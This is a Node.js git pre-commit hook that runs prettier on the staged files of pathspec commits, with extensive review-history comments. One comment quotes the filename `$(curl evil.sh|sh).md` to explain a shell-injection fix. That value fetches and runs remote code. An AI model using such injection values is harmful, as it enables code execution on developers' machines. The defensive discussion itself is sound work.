#!/usr/bin/env node
// scripts/hooks/pathspec-commit-prettier.mjs — plan 3968, decision-table row 4 ("nothing
// flips it in the clone").
//
// WHY. A PATHSPEC commit (`git commit -m "…" -- <file>`) runs against a TEMPORARY index —
// git sets `GIT_INDEX_FILE` to a scratch file for the duration of the hooks, distinct from
// the checkout's own `.git/index` — and lint-staged 17's post-task "Updating Git index
// again" step (`gitWorkflow.js:283-339`) then runs `git update-index --again` TWICE: once
// against that temp index, once against the checkout's DEFAULT index/lock, because a
// pathspec commit with no explicit `git add` means the default index needs updating too
// (its own comment, `:311-315`). Task 1's reproduction matrix (17 trials on a byte-identical
// clone of the shared MAIN checkout, same lint-staged 17.0.5 / `feature.manyFiles` /
// `core.fsmonitor` config) never reproduced the silent truncation this plan investigates in
// isolation — see repro-3968-matrix.md — but the double index write is real on every
// pathspec commit regardless, and removing it costs nothing: `prettier --check .` already
// gates every push (`.husky/pre-push` via the lint gate), so a pre-commit reformat of a
// pathspec commit's own staged paths is redundant with that gate, not a substitute for it.
//
// WHAT THIS DOES. For a pathspec commit ONLY: skip lint-staged (and its stash / index-write
// machinery) entirely, and run `prettier --check` directly against the paths staged in the
// TEMPORARY index (via `GIT_INDEX_FILE`, inherited, never rewritten). No `git add`, no
// `git update-index`, no stash — no index write of any kind from this path. An ORDINARY
// commit (no `GIT_INDEX_FILE`, or one pointing at the checkout's own default index — e.g. a
// worktree session, where the default index is `.git/worktrees/<name>/index`) is untouched:
// `isPathspecCommit` returns false and `.husky/pre-commit` falls through to lint-staged
// exactly as before.
//
// DETECTION. The default index is resolved as `git rev-parse --absolute-git-dir` + `/index`
// — NOT `--git-common-dir` — because in a linked worktree the right comparison is the
// worktree's OWN index (`.git/worktrees/<name>/index`), the file an ordinary commit in that
// worktree actually updates; the common dir would name a file no ordinary commit ever
// touches, false-positiving every worktree commit as "pathspec". `GIT_INDEX_FILE` itself is
// resolved to an ABSOLUTE path against `cwd` before comparing — MEASURED, not assumed: git
// sets it to the RELATIVE `.git/index` for an ordinary commit and to an ABSOLUTE temp-index
// path for a pathspec one, so a raw compare of the two shapes misclassified every ordinary
// commit as "pathspec" (isPathspecCommit's own header has the full story). Compared via the
// shared, platform-gated `pathsEqual` on top of that (backslash/forward-slash + case fold,
// win32 ONLY) — Windows paths from `git rev-parse` and from `GIT_INDEX_FILE` are not
// guaranteed byte-identical even once both are absolute, but POSIX paths ARE case-sensitive
// and never carry a backslash separator, so folding them the same way would treat two
// genuinely different paths as equal (see isPathspecCommit's own header, finding 68c142).
//
// FAIL-OPEN. Any exception anywhere in this module's CLI path (a `git` invocation failing, a
// malformed env, a thrown error) is caught at the top and treated exactly like "not a
// pathspec commit": exit 0, fall through to lint-staged, which is today's unchanged
// behaviour. A missing/torn prettier install is ALSO treated this way —
// `defaultRunPrettier`'s own `existsSync` check (and, defensively, its spawn-failure
// classifier) reports `ok: null` rather than `ok: false`, so it can never be misread as
// "prettier found unformatted files" and block a commit. `.husky/pre-commit`'s own
// bin-shim-ensure step (unchanged, runs after this guard) still repairs that case for the
// lint-staged fallback path. ONE case deliberately does NOT fail open (plan 3986): a staged
// file whose own content overflows prettier's stdout capture is
// reported `ok: false` (blocked), because "too big to check" must never be indistinguishable
// from "checked and clean" — that indistinguishability is exactly what let the guard fall
// through to lint-staged on the first real pathspec commit after plan 3968 landed.
//
// EXIT CODES (read by `.husky/pre-commit`):
//   0  not a pathspec commit, OR any internal error/inconclusive result → fall through to
//      lint-staged, unchanged.
//   1  a pathspec commit whose staged paths fail `prettier --check` → block the commit; the
//      offending files and the one-line fix are printed to stderr.
//   3  a pathspec commit that is clean (prettier passed, or nothing to check) → skip
//      lint-staged entirely; the commit proceeds.

import { execFileSync } from 'node:child_process';
import { existsSync } from 'node:fs';
import { join, resolve as resolvePath } from 'node:path';
import { fileURLToPath } from 'node:url';
import { pathsEqual } from './main-checkout-rebase-guard.mjs';
import { gitIsolatedEnv } from '../coord/child-env.mjs';

// The ONE stdout-capture limit for every child this module spawns (plan 3986 review, 5608ea):
// the two git reads below and the prettier spawn further down all capture into the same kind of
// buffer, and a SECOND, independently-tuned literal is exactly the drift that makes a future
// "raise the limit" change fix one boundary and leave the other refusing at the old size.
//
// Why it has to be raised at all: `execFileSync`'s DEFAULT `maxBuffer` is 1 MiB, and that
// default is what broke this hook on the very first pathspec commit after plan 3968 landed
// (MEASURED on the shared MAIN checkout). A `--check` verdict is one short line, so 1 MiB looks
// generous — but for a path prettier IGNORES, `--check --stdin-filepath` writes the input
// straight back to stdout unchanged (prettier 3.8.3), so the captured stdout is the size of the
// FILE. `docs/handoff/` is in `.prettierignore` and `docs/handoff/infra-debt.md` is 1,940,805
// bytes, so the echo overflowed the default buffer, node threw ENOBUFS, and the hook fell open
// to lint-staged — re-introducing the "Updating Git index again" step plan 3968 exists to
// remove. 64 MiB holds the echo of any doc this repo plausibly commits; past it, EVERY boundary
// (`git cat-file`, `git diff --cached`, prettier) refuses rather than waving the commit through.
const MAX_CAPTURE_BYTES = 64 * 1024 * 1024;

// Windows path comparison: fold separators and case ONLY — the CALLER (checkPathspecCommit
// below) is responsible for handing both sides in already-resolved-absolute form; this
// function does not itself resolve anything, so it stays a pure string comparison with no
// cwd dependence of its own. Kept for callers/tests that want a normalised string rather than
// an equality verdict; isPathspecCommit itself now delegates to the shared, PLATFORM-AWARE
// `pathsEqual` below (plan 3968 review, 68c142) rather than this function's unconditional fold.
export function normalizeIndexPath(p) {
  return String(p ?? '')
    .replace(/\\/g, '/')
    .toLowerCase();
}

// Pure — the exported detection primitive the plan's decision table pins. `gitIndexFile` and
// `defaultIndexPath` must BOTH already be absolute (see checkPathspecCommit's own resolution
// step) — MEASURED, not assumed (plan 3968 verification): for an ORDINARY commit git sets
// `GIT_INDEX_FILE` to the RELATIVE `.git/index` (relative to the hook's cwd, i.e. the
// checkout's own top level), while for a PATHSPEC commit it is always absolute (the internal
// temp-index path, e.g. `…/.git/next-index-<pid>.lock`). A raw string compare of the two
// therefore misclassified every ORDINARY commit as "pathspec" — `.git/index` normalises to a
// different string than `resolveDefaultIndexPath`'s absolute result even though they name the
// SAME file — and skipped lint-staged on commits this guard must never touch. Comparing two
// already-absolute paths is what makes this function pure and still correct.
//
// `platform` is a parameter (default `process.platform`), not read inline, so the win32-only
// case/backslash fold is directly testable on any host — see main-checkout-rebase-guard.mjs's
// own header. Review finding 68c142: this used to fold case/backslash UNCONDITIONALLY (this
// module's own now-deprecated-for-this-purpose `normalizeIndexPath`), which on POSIX treated
// two genuinely DIFFERENT paths (e.g. `/repo/.git/INDEX` vs `/repo/.git/index`) as equal and
// misclassified a real pathspec commit as ordinary, falling through to lint-staged — reusing
// the shared, already-platform-gated `pathsEqual` (also used by main-checkout-rebase-guard.mjs)
// instead of a second, divergent normaliser closes that.
export function isPathspecCommit({ gitIndexFile, defaultIndexPath, platform = process.platform }) {
  const g = String(gitIndexFile ?? '').trim();
  if (!g) return false; // no temp index at all → ordinary commit
  return !pathsEqual(g, defaultIndexPath, platform);
}

// `git rev-parse --absolute-git-dir` rather than `--git-dir`: the latter can return a path
// RELATIVE to `cwd` (the main checkout's own `.git`, from a call made at the repo root), and
// resolving it correctly would need to re-derive the same cwd-dependence this module's pure
// detection function deliberately avoids. `--absolute-git-dir` (git ≥ 2.13) already does that
// resolution once, inside git, and is also worktree-correct: run from a linked worktree it
// reports THAT worktree's own gitdir (`.git/worktrees/<name>`), not the shared common dir.
export function resolveDefaultIndexPath(cwd, { exec = execFileSync } = {}) {
  const gitDir = String(
    exec('git', ['-C', cwd, 'rev-parse', '--absolute-git-dir'], { encoding: 'utf8' }),
  ).trim();
  return join(gitDir, 'index');
}

// The staged paths of the PATHSPEC commit's own temporary index — read via `GIT_INDEX_FILE`
// inherited into the child, never written. `--diff-filter=ACMR` mirrors what a formatter
// cares about (added/copied/modified/renamed content); a deleted path has no content left to
// check. Filter capitalisation is intentionally upper-case only (no lower-case complement
// requested) — this reads the diff, it does not exclude anything by case.
//
// `-z` (NUL-delimited, no quoting/escaping) instead of the default newline-delimited output —
// review findings 2c4ce7/723458/2b5843/0d3d46: a plain `--name-only` + `.split('\n').map(trim)`
// corrupts two real classes of legal Git path: a name containing an embedded newline (git
// quotes such names by default, which `-z` disables entirely — no quoting, so the NUL split
// yields the exact byte sequence git has recorded) and a name with a leading/trailing space
// (`.trim()` silently rewrites it to a DIFFERENT, possibly nonexistent, path). `-z` sidesteps
// both: paths come back byte-for-byte, separated only by NUL, which is never itself a legal
// path character, so a plain split is exact and no trim is needed or applied.
// Review finding b83f03: this used to build its env as `{ ...process.env, GIT_INDEX_FILE:
// gitIndexFile }`, which LAYERS the pathspec commit's temp index on top of whatever
// `GIT_DIR`/`GIT_WORK_TREE`/`GIT_COMMON_DIR`/`GIT_PREFIX` the ambient process already carries
// (a poisoned or merely differently-scoped git env — a linked worktree's hook running under a
// caller that set one of these for its own purposes) — a rebind this hook never intends and
// that can make it read the WRONG repository or object store while still believing it checked
// the right one. `gitIsolatedEnv` (the same seam `index-sanity.mjs` already uses for this exact
// genre of local, network-free git read) drops the whole `GIT_*` namespace first and then
// re-applies `GIT_INDEX_FILE` as the one setting this call actually needs — the temp index is
// the whole point, everything else about "which repo" must come only from the `-C cwd` above.
export function listPathspecStagedPaths(cwd, gitIndexFile, { exec = execFileSync } = {}) {
  const out = exec(
    'git',
    // `T` (typechange) belongs with ACMR (plan 3986 review r3, c066c0): replacing a tracked
    // symlink or submodule with a REGULAR FILE stages real content prettier must see, and
    // omitting the letter made that the one staged shape this guard silently never checked.
    ['-C', cwd, 'diff', '--cached', '--name-only', '-z', '--diff-filter=ACMRT'],
    {
      encoding: 'utf8',
      env: gitIsolatedEnv({ GIT_INDEX_FILE: gitIndexFile }),
      maxBuffer: MAX_CAPTURE_BYTES, // a large pathspec batch commit still fits comfortably
    },
  );
  return String(out).split('\0').filter(Boolean);
}

// The staged BLOB content for one path (or `null` when that path is not a regular file, e.g. a
// symlink or a submodule gitlink - see the mode check below), read straight out of the pathspec
// commit's own temporary index — never the working tree. Review findings bdedc8/0b3f96/3b0f73: the
// previous version handed these SAME staged path names to Prettier without ever reading them
// through this seam, so Prettier opened the WORKING-TREE copy of each file instead of the
// content actually about to be committed — wrong in both directions (a formatted staged blob
// rejected because an unstaged edit left the disk copy messy, and the reverse: an unformatted
// staged blob waved through because the disk copy happened to be clean).
//
// Review finding aa0cee (round 2): this used to resolve the blob via `git show :<path>` —
// git's revision grammar parses a leading `<digit>:` in the STRING AFTER the colon as a stage
// number, so a legal staged path beginning with digits-then-colon (`2:foo.txt`) was misread as
// "stage 2 of foo.txt" rather than "stage 0 of 2:foo.txt", silently checking the wrong blob's
// content (or erroring, on the common no-such-stage case — this module's own fail-open then
// masks it as "could not read the staged content", never surfacing the actual misparse).
// `git ls-files -s -z -- <path>` sidesteps the REVISION grammar entirely: `<path>` is a
// PATHSPEC argument, not revision syntax, so a leading `digit:` is just bytes in a filename.
// Its `-s` output is `<mode> <sha> <stage>\t<path>` (`-z` NUL-terminated, no quoting) for every
// stage entry at that path; stage 0 is the ordinary (non-conflicted) staged entry this hook
// always wants. The resolved sha is then read with `git cat-file blob <sha>` — a plain
// object-store lookup, independent of any path/revision parsing.
//
// Review finding 146f5e (round 3, and its duplicates 2733d6/f27ce8/7a36e7/189af6): a bare
// PATHSPEC is not yet a LITERAL path — git's pathspec grammar itself has magic (`*`, `?`,
// `[ab]`, a leading `:(...)` prefix) that a legal filename can trigger, so `foo*.md`,
// `foo[ab].md`, or `:(top)bad.md` could resolve to the WRONG stage-0 entry (a same-directory
// sibling the wildcard also matches) or to none at all, either of which is checked/reported by
// this hook as if it were the requested file. The global `--literal-pathspecs` option (placed
// before the subcommand, alongside `-C`) turns EVERY pathspec argument for the rest of that
// invocation into a literal byte-for-byte path — no wildcard, no `:(...)` prefix parsing — so
// this closes the same class of misparse `--` already closed for OPTION-looking paths.
export function readStagedBlob(cwd, gitIndexFile, path, { exec = execFileSync } = {}) {
  // Review finding b83f03: same ambient-repo-selector hazard as listPathspecStagedPaths above —
  // `gitIsolatedEnv` scrubs `GIT_DIR`/`GIT_WORK_TREE`/`GIT_COMMON_DIR`/`GIT_PREFIX` (and the rest
  // of the `GIT_*` namespace) before re-applying `GIT_INDEX_FILE`, so neither the `ls-files`
  // stage-0 lookup nor the `cat-file blob` read below can be silently redirected at a different
  // repository or object store than the one named by `-C cwd`.
  const env = gitIsolatedEnv({ GIT_INDEX_FILE: gitIndexFile });
  const raw = exec('git', ['-C', cwd, '--literal-pathspecs', 'ls-files', '-s', '-z', '--', path], {
    encoding: 'utf8',
    env,
    maxBuffer: MAX_CAPTURE_BYTES,
  });
  const entries = String(raw).split('\0').filter(Boolean);
  // `-s` line shape: "<mode> <sha> <stage>\t<path>". Stage 0 is the normal staged entry; a
  // conflicted path can carry stages 1-3 instead and no stage 0 at all, which this hook
  // (pathspec commits never proceed over an unresolved conflict) is not expected to meet, but
  // picking stage 0 explicitly rather than "the first line" keeps that shape from silently
  // reading the wrong side of a conflict if it ever does.
  let sha;
  let mode;
  for (const line of entries) {
    const tab = line.indexOf('\t');
    if (tab === -1) continue;
    const [entryMode, entrySha, stage] = line.slice(0, tab).split(' ');
    if (stage === '0') {
      sha = entrySha;
      mode = entryMode;
      break;
    }
  }
  if (!sha) {
    throw new Error(`no stage-0 index entry found for staged path: ${path}`);
  }
  // A staged entry that is not a REGULAR FILE has no source for prettier to check, and reading
  // it as if it were is actively wrong (plan 3986 review r4): a symlink's blob is its TARGET
  // PATH, which prettier would parse as markdown/JS and almost always call unformatted - a false
  // refusal on a legal commit. A gitlink (submodule, 160000) has no blob in this repo at all, so
  // `cat-file` would fail and the module's read-error path would fail open on it. Both are
  // reachable through the `T` typechange letter the listing gained in r3, and the gitlink one was
  // already reachable as an ordinary `A`. `null` means "nothing here to check", never "clean".
  if (mode !== '100644' && mode !== '100755') return null;
  return exec('git', ['-C', cwd, 'cat-file', 'blob', sha], {
    encoding: 'utf8',
    env,
    maxBuffer: MAX_CAPTURE_BYTES,
  });
}

// Never `pnpm exec prettier` here — MEASURED, not theoretical (plan 3968 verification, see
// the plan body's execution notes): a git hook runs as a child of `git.exe` itself, under a
// far more minimal PATH than an interactive shell or a top-level `node scripts/*.mjs` call —
// `execFileSync('pnpm', …)` reliably threw `spawnSync pnpm ENOENT` from inside a real
// `.husky/pre-commit` run in the verification clone, even though the SAME `pnpm exec
// prettier` line, run as ordinary shell text further down `.husky/pre-commit`, resolved
// `pnpm` fine (the shell's PATH, not node's, and husky's own `_/h` wrapper additionally
// prepends `node_modules/.bin`). Going straight to prettier's own CLI entry point via
// `process.execPath` — the exact node binary already running — sidesteps PATH/shim
// resolution (`pnpm`, `pnpm.CMD`, corepack, …) entirely; it is also what this module's own
// test file already does for its one real-prettier integration case, so this is that same
// approach promoted to production rather than a second, divergent path.
function resolvePrettierCli(cwd) {
  return join(cwd, 'node_modules', 'prettier', 'bin', 'prettier.cjs');
}

// True when a child's stdout overflowed the capture buffer. CODES ONLY, never a text match on
// the message (plan 3986 review r2 b02a77 widened this to a `/maxBuffer/i` message match; r3
// 1c3989/f3353a/cef86f/1e4fe3 rejected that widening and they are right): `execFileSync` folds a
// child's own stderr into `e.message`, so any git or prettier diagnostic that merely CONTAINS
// the word would be misreported as a 64 MiB overflow — blocking a legitimate commit and telling
// the operator to raise a limit that was never reached, while hiding the real error. The SYNC
// path this module uses reports an overflow as `code: 'ENOBUFS'` (MEASURED on the real prettier
// spawn); `ERR_CHILD_PROCESS_STDIO_MAXBUFFER` is node's async-twin shape, kept as a free
// equality check that cannot false-positive.
export function isCaptureOverflow(e) {
  return e?.code === 'ENOBUFS' || e?.code === 'ERR_CHILD_PROCESS_STDIO_MAXBUFFER';
}

// The refusal text for a staged file whose content cannot be captured at all — shared by BOTH
// overflow boundaries (the `git cat-file` read and the prettier spawn) so they read identically
// to the operator. `bytes` is null when the size is not known: the read boundary overflows
// before anything has the content in hand to measure.
function oversizeRefusal(path, bytes, code) {
  const size = bytes == null ? 'exceeds' : `is ${bytes} bytes, which exceeds`;
  return (
    `${path}: staged content ${size} the ${MAX_CAPTURE_BYTES}-byte capture limit (${code}), ` +
    `so its formatting could NOT be checked. Refusing rather than skipping the check; raise ` +
    `MAX_CAPTURE_BYTES in scripts/hooks/pathspec-commit-prettier.mjs if a file this large is ` +
    `legitimate.`
  );
}

// True for a spawn-level failure (missing/broken binary) rather than a real "prettier ran
// and found issues" result. Kept as a defense-in-depth text match (a corrupted prettier.cjs,
// an unexpected node module-resolution error) even though `defaultRunPrettier`'s own
// `existsSync` check below already catches the common case (a missing/torn install) before
// ever spawning anything.
// `EACCES`/`EPERM`/`UNKNOWN` join `ENOENT` (plan 3986 review r3, 84ea15): each is the CLI
// failing to START, which is the documented inconclusive case, not "prettier ran and found
// issues" — reporting one as a formatting failure would block a commit over a broken install.
const SPAWN_FAILURE_CODES = new Set(['ENOENT', 'EACCES', 'EPERM', 'UNKNOWN']);

export function isSpawnFailure(e) {
  if (e && SPAWN_FAILURE_CODES.has(e.code)) return true;
  // `e.stdout` is deliberately NOT scanned (plan 3986, MEASURED): for a `.prettierignore`'d
  // `--stdin-filepath`, prettier echoes the stdin content straight back on stdout, so stdout
  // here can be arbitrary FILE CONTENT rather than anything prettier itself said. The file
  // that triggered the incident, `docs/handoff/infra-debt.md`, carries the literal string
  // `ENOENT` three times inside its first megabyte — which is precisely how the ENOBUFS throw
  // handled in `defaultRunPrettier` below used to be misread as a missing-binary transport
  // failure and fail OPEN on the one commit the hook exists to protect. Only stderr and the
  // Error's own message describe the spawn itself.
  const text = `${e?.stderr ?? ''}${e?.message ?? ''}`;
  return /is not recognized as an internal or external command|command not found|cannot find module|ENOENT/i.test(
    text,
  );
}

// Default prettier runner — injectable so the unit tests need no real prettier spawn (see
// the test file's fake `runPrettier`). Returns:
//   { ok: true }                          — prettier --check passed
//   { ok: false, output }                  — prettier --check found unformatted file(s)
//   { ok: null,  output }                  — inconclusive (spawn/binary failure) — fail-open
//
// Checks the STAGED content, not the working tree (review findings bdedc8/0b3f96/3b0f73):
// one spawn PER path, each fed that path's staged blob (read via `readStagedBlob`, i.e.
// `GIT_INDEX_FILE`-scoped `git show :<path>`) on stdin, with `--stdin-filepath <path>` so
// Prettier still resolves the right parser AND the right `.prettierignore`/config for that
// path — MEASURED (plan 3968 verification): prettier 3.8.3's `--check --stdin-filepath`
// applies `.prettierignore` exactly as the filesystem-path form does (an ignored path's
// content passes through unexamined) and still exits 1 on unformatted stdin content, so this
// is a drop-in content source, not a behavioural narrowing. One spawn per path rather than one
// batched call is deliberate and, per the module header's EXIT CODES note, cheap here: a
// pathspec commit stages 1 to a handful of files (never the wide batches `git commit -a`-style
// commits can), which is also why the argv-length hazard `prettierArgChunks` exists for
// elsewhere (done-worktree's own prettier gate, which spreads a full CI-sized file list into
// one argv) never arises here — this shape's argv per spawn is always exactly one short path.
export function defaultRunPrettier(paths, { cwd, gitIndexFile, exec = execFileSync } = {}) {
  const cli = resolvePrettierCli(cwd);
  if (!existsSync(cli)) {
    return { ok: null, output: `prettier CLI not found at ${cli} (missing/torn install)` };
  }
  const badPaths = [];
  const badOutputs = [];
  // The verdict must not depend on the ORDER git happens to list the staged paths in (plan 3986
  // review, ba1d88 then 5a42aa). An inconclusive path - a blob that cannot be read, a spawn that
  // fails - used to `return { ok: null }` on the spot, which both discarded any refusal already
  // accumulated AND ended the loop before the remaining paths were looked at, so an oversized
  // file staged second went unchecked while the same pair staged the other way round refused.
  // So: every path is always visited, inconclusiveness is merely REMEMBERED, and the verdict is
  // decided once at the end - a refusal always outranks an inconclusive.
  let inconclusiveOutput = null;
  const noteInconclusive = (output) => {
    if (inconclusiveOutput === null) inconclusiveOutput = output;
  };
  // NOT latched on a spawn failure (plan 3986 review r3 c33ac9 asked for that; r4 refuted it and
  // r4 is right): a spawn error can be path-SPECIFIC, so skipping every later path to save a
  // handful of redundant launches would let a genuinely unformatted file through. A pathspec
  // commit stages 1 to a handful of files; there is nothing to save.
  for (const path of paths) {
    let content;
    try {
      content = readStagedBlob(cwd, gitIndexFile, path, { exec });
    } catch (e) {
      // A blob too big to capture overflows HERE, at `git cat-file`, before prettier is ever
      // spawned (plan 3986 review, cf2962/c9b8ea/8e775a: the ENOBUFS branch below is
      // unreachable for a genuinely oversized file, because this read throws first). Same
      // verdict as the prettier-side overflow: refuse, never fail open.
      if (isCaptureOverflow(e)) {
        badPaths.push(path);
        badOutputs.push(oversizeRefusal(path, null, e?.code));
        continue;
      }
      // Cannot read the staged blob at all (a malformed temp index, a git version quirk) —
      // inconclusive, never a block: fail open exactly like a missing prettier binary.
      noteInconclusive(`could not read the staged content of ${path}: ${String(e?.message ?? e)}`);
      continue;
    }
    // Not a regular file (symlink, submodule gitlink): nothing prettier could check.
    if (content === null) continue;
    try {
      // stdio fully piped (never 'inherit'): execFileSync's own default streams a failing
      // child's stderr straight to THIS process's stderr in addition to capturing it on the
      // thrown error — verified live in the plan-3968 clone verification, a refused pathspec
      // commit printed prettier's "Code style issues found" warning TWICE (once inherited,
      // once via this module's own printFailureBlock re-emitting the captured `output`).
      // Piping all three streams keeps the operator-facing message to ONE clean copy.
      execFileSync(
        process.execPath,
        // `--stdin-filepath=${path}` as ONE token, not two separate argv entries (plan 3968
        // review, dfacea): a staged path that itself looks like an option (`-foo.md`,
        // `--bar.js`) handed as a SEPARATE argv entry after a bare `--stdin-filepath` is
        // parsed by prettier's own CLI as a flag in its own right, not as that flag's value —
        // prettier then silently ignores the "unknown option" and exits 0 on stdin content it
        // never actually associated with a real path, which can pass through unformatted. The
        // `=`-joined form has no argv boundary for prettier's parser to misread the value at.
        [cli, '--check', '--ignore-unknown', `--stdin-filepath=${path}`],
        {
          cwd,
          input: content,
          encoding: 'utf8',
          stdio: ['pipe', 'pipe', 'pipe'],
          maxBuffer: MAX_CAPTURE_BYTES, // see the constant's own header — an ignored file's echo
        },
      );
    } catch (e) {
      // ENOBUFS is a failure of THIS path's check, never a transport failure (plan 3986): the
      // spawn itself worked, we simply could not capture what it wrote. Classified BEFORE
      // `isSpawnFailure` and mapped to `ok: false`, so an oversized file is refused loudly
      // instead of silently skipping the guard — the whole point of this plan.
      if (isCaptureOverflow(e)) {
        badPaths.push(path);
        badOutputs.push(oversizeRefusal(path, Buffer.byteLength(content, 'utf8'), e?.code));
        continue;
      }
      const raw = `${e?.stdout ?? ''}${e?.stderr ?? ''}`.trim() || String(e?.message ?? e);
      if (isSpawnFailure(e)) {
        noteInconclusive(raw);
        continue;
      }
      badPaths.push(path);
      // Prettier's own stdin-mode output names the stream "(stdin)", never the real path we
      // gave it via --stdin-filepath — re-label with the actual staged path so the combined
      // `output` (appended verbatim under printFailureBlock's own path list) still reads as
      // one coherent per-file report instead of several bare "(stdin)" lines.
      badOutputs.push(`${path}: ${raw}`);
    }
  }
  if (badPaths.length) {
    return {
      ok: false,
      output:
        badOutputs.filter(Boolean).join('\n') ||
        `Code style issues found in: ${badPaths.join(', ')}`,
    };
  }
  if (inconclusiveOutput !== null) return { ok: null, output: inconclusiveOutput };
  return { ok: true };
}

// The whole decision, pure aside from its injected git/exec/prettier seams. Never throws by
// design intent (every git call it makes can still throw — the CLI entrypoint below is what
// catches that and fails open; this function stays a thin, directly-testable composition).
//
//   { pathspec: false }                                  — ordinary commit, do nothing
//   { pathspec: true, ok: true,  paths }                  — clean (or nothing staged)
//   { pathspec: true, ok: false, paths, output }          — prettier found unformatted files
//   { pathspec: true, ok: null,  paths, output }          — inconclusive → fail open
export function checkPathspecCommit({
  cwd = process.cwd(),
  env = process.env,
  exec = execFileSync,
  runPrettier = defaultRunPrettier,
} = {}) {
  const rawGitIndexFile = env.GIT_INDEX_FILE;
  if (!rawGitIndexFile) return { pathspec: false };

  // Resolve to absolute HERE, against `cwd` (the checkout top level a git hook always runs
  // from) — see isPathspecCommit's header for why this step cannot be skipped: an ordinary
  // commit's `GIT_INDEX_FILE` is the relative `.git/index`, not an absolute path.
  const gitIndexFile = resolvePath(cwd, rawGitIndexFile);
  const defaultIndexPath = resolveDefaultIndexPath(cwd, { exec });
  if (!isPathspecCommit({ gitIndexFile, defaultIndexPath })) {
    return { pathspec: false };
  }

  // An overflow HERE is the same contract as an overflow on a blob (plan 3986 review,
  // bfe805/3f5398): if the staged-path listing cannot be captured, nothing about this commit can
  // be checked, and an uncaught throw would reach the CLI's fail-open catch and exit 0. Only an
  // overflow is converted — any other git failure still propagates to that catch, which is the
  // module's deliberate "could not determine, behave as before" contract.
  let paths;
  try {
    paths = listPathspecStagedPaths(cwd, gitIndexFile, { exec });
  } catch (e) {
    if (!isCaptureOverflow(e)) throw e;
    return {
      pathspec: true,
      ok: false,
      paths: [],
      output:
        `the staged-path listing for this pathspec commit exceeds the ${MAX_CAPTURE_BYTES}-byte ` +
        `capture limit, so its staged paths could NOT be enumerated, let alone checked. Refusing ` +
        `rather than skipping the check.`,
    };
  }
  if (paths.length === 0) {
    return { pathspec: true, ok: true, paths };
  }

  const result = runPrettier(paths, { cwd, gitIndexFile });
  return { pathspec: true, ok: result.ok, paths, output: result.output };
}

// The remediation line(s) for a failed pathspec-commit prettier check — pulled out of
// printFailureBlock (which only adds the trailing prettier `output`, if any) so a test can
// assert on the exact text without capturing process.stderr.
//
// Round 4 (plan 3968 review, findings 09983b/2e2860/e2d83a/c98090/1f38e4/1f221a/1d7e4d/c9838b/
// c8d5e5/5268b6/6f9a9b): round 3's `quoteForShell` double-quoted a path for the printed "Fix"
// command (superseding round 2's single-quote form, itself invalid PowerShell syntax — findings
// 3894f9/7d7e3d/71c0b6/e56c4a/67df75) but double quotes do NOT suppress `$(...)` command
// substitution or backtick expansion in EITHER Git Bash or PowerShell (PowerShell's own `$(...)`
// subexpression operator evaluates inside a double-quoted string too) — so a staged path like
// `$(curl evil.sh|sh).md` still executed when the printed command was copy-pasted. There is no
// quoting scheme that is simultaneously safe in both shells for every character a legal Git path
// can contain (`$`, a backtick, and `"` each need a different, mutually incompatible escape) —
// so this never again embeds a path INSIDE a copyable command line at all. `quoteForShell` and
// the quotable/unquotable split are gone with it: paths are listed raw, one per line (never
// parsed as shell text, so nothing in them can expand or substitute), and the fix command itself
// carries a literal `<path>` placeholder the operator fills in by hand, once per path, quoted
// however their own shell requires.
export function buildFixLines(paths) {
  return [
    `pathspec-commit-prettier: ${paths.length} staged file(s) are not prettier-formatted:`,
    ...paths.map((p) => `  - ${p}`),
    'Run `pnpm exec prettier --write -- <path>` on each path listed above (quote it for your shell), then re-commit.',
  ];
}

function printFailureBlock(paths, output) {
  // A refusal can carry no path list at all (the staged-path listing itself overflowed), and
  // buildFixLines' "0 staged file(s) are not prettier-formatted" header would then be a lie.
  if (paths.length === 0) {
    process.stderr.write(`pathspec-commit-prettier: ${String(output ?? '').trim()}\n`);
    return;
  }
  const lines = [...buildFixLines(paths)];
  if (output) {
    lines.push('', output.trim());
  }
  process.stderr.write(`${lines.join('\n')}\n`);
}

// Exported for the CLI branch below AND for `.husky/pre-commit`'s own reasoning to be
// testable independent of a real process.exit — see pathspec-commit-prettier.test.mjs.
//
//   ok === true   → 3 (skip lint-staged, commit proceeds — prettier already confirmed clean)
//   ok === false  → 1 (block — prettier found unformatted staged file(s))
//   ok === null   → 0 (inconclusive, e.g. a torn/missing prettier binary — fall through to
//                       lint-staged, which already carries the bin-shim-heal step this
//                       module deliberately does not duplicate)
//   not pathspec  → 0 (ordinary commit, unchanged)
export function decideExitCode(result) {
  if (!result.pathspec) return 0;
  if (result.ok === false) return 1;
  if (result.ok === true) return 3;
  return 0;
}

// ── main ─────────────────────────────────────────────────────────────────────

function main() {
  const result = checkPathspecCommit();
  if (result.pathspec && result.ok === false) {
    printFailureBlock(result.paths, result.output);
  }
  process.exitCode = decideExitCode(result);
}

if (process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1]) {
  try {
    main();
  } catch {
    // Fail-open (see header): any unexpected failure — a git invocation throwing for a
    // reason other than the ones handled above, a malformed env — is indistinguishable
    // from "could not determine, so behave as before": exit 0, fall through to lint-staged.
    process.exitCode = 0;
  }
}

export { main };
